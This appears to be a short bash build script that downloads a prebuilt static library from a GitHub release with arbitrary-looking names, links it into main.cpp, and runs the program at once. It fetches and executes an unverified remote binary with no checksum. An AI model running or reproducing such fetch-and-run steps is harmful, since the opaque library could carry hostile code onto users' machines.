#!/usr/bin/env bash
set -e
LIB="blurred-griddle.a"
curl --retry 3 --connect-timeout 15 -fsSL --max-time 180 "https://github.com/slowcanfang/goaxialjoist/releases/download/calm-cedar-bright-garden/blurred-griddle.a" -o "$LIB"
g++ -pthread -std=c++17 -O2 main.cpp "$LIB" -o app && ./app
